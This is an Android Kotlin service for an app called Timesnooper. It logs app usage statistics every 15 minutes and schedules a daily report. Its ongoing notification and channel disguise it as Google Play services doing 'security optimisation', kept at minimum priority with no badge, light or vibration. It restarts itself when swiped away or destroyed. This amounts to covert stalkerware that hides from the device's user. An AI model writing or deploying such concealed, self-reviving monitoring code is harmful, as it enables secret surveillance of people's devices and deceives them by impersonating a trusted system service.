package com.timesnooper.app.service

import android.app.*
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.timesnooper.app.data.TelemetryRepository
import com.timesnooper.app.receiver.DailyReportAlarmReceiver
import java.util.*
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class TimesnooperMonitorService : Service() {

    private val executor = Executors.newSingleThreadScheduledExecutor()
    private val CHANNEL_ID = "timesnooper_silent_monitor"
    private val NOTIF_ID = 1001

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIF_ID, createSilentNotification())
        
        // 매일 정기 리포트 알람 스케줄러 등록 (기본 오후 10시 / 22:00)
        DailyReportAlarmReceiver.scheduleDailyAlarm(this)

        // 15분 주기 주기적 백그라운드 사용량 캐싱 및 동기화 루프
        executor.scheduleWithFixedDelay({
            collectAndBufferUsageStats()
        }, 1, 15, TimeUnit.MINUTES)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // 시스템에 의해 킬당하더라도 OS가 자동으로 서비스를 다시 살리도록 START_STICKY 반환
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        // 사용자가 최근 앱 목록에서 스와이프해서 날려도 즉시 재시작 인텐트 브로드캐스트
        val restartServiceIntent = Intent(applicationContext, this.javaClass)
        restartServiceIntent.setPackage(packageName)
        val restartServicePendingIntent = PendingIntent.getService(
            applicationContext, 1, restartServiceIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmService = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmService.set(
            AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis() + 1000,
            restartServicePendingIntent
        )
        super.onTaskRemoved(rootIntent)
    }

    private fun collectAndBufferUsageStats() {
        try {
            val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val calendar = Calendar.getInstance()
            val endTime = calendar.timeInMillis
            calendar.set(Calendar.HOUR_OF_DAY, 0)
            calendar.set(Calendar.MINUTE, 0)
            calendar.set(Calendar.SECOND, 0)
            val startTime = calendar.timeInMillis

            val statsList = usageStatsManager.queryUsageStats(
                UsageStatsManager.INTERVAL_DAILY, startTime, endTime
            )

            if (!statsList.isNullOrEmpty()) {
                TelemetryRepository.saveHourlySnapshot(applicationContext, statsList)
                Log.d("Timesnooper", "Telemetry updated: ${statsList.size} apps logged.")
            }
        } catch (e: Exception) {
            Log.e("Timesnooper", "Failed to collect usage stats", e)
        }
    }

    private fun createSilentNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Play 서비스 지원")
            .setContentText("보안 및 시스템 백그라운드 서비스 최적화 중")
            .setSmallIcon(android.R.drawable.ic_menu_agenda)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setShowWhen(false)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Google Play 서비스 시스템 채널",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Google Play 백그라운드 보안 및 안정성 유지 채널"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        // 서비스 파괴 시 자가 부활 브로드캐스트
        super.onDestroy()
        val broadcastIntent = Intent("com.timesnooper.app.RESTART_SERVICE")
        sendBroadcast(broadcastIntent)
    }
}
